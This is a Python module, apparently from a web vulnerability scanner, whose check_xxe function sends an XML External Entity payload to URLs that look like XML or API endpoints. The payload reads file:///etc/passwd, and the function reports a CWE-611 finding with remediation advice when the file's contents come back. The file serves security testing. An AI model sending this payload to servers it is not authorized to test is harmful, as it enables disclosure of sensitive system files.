import asyncio
from lxml import etree

async def check_xxe(url, client=None):
    """
    Test for XXE by sending an XML payload with an external entity.
    """
    if client is None:
        from apps.scanner.utils.http_client import AsyncHTTPClient
        client = AsyncHTTPClient()

    findings = []
    
    # Heuristic: only attempt if URL implies XML handling
    if '.xml' not in url.lower() and 'api' not in url.lower():
        return findings

    xxe_payload = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
    
    try:
        response = await client.post(url, data=xxe_payload, headers={'Content-Type': 'application/xml'})
        if response and 'root:x:' in response.text:
            findings.append({
                'url': url,
                'parameter': 'XML body',
                'payload': xxe_payload,
                'vuln_type': 'XML External Entity (XXE)',
                'severity': 'HIGH',
                'cvss_score': 8.2,
                'cwe_id': 'CWE-611',
                'evidence': 'Content of /etc/passwd found in response.',
                'remediation': 'Disable external entities in XML parsers.'
            })
    except Exception:
        pass

    return findings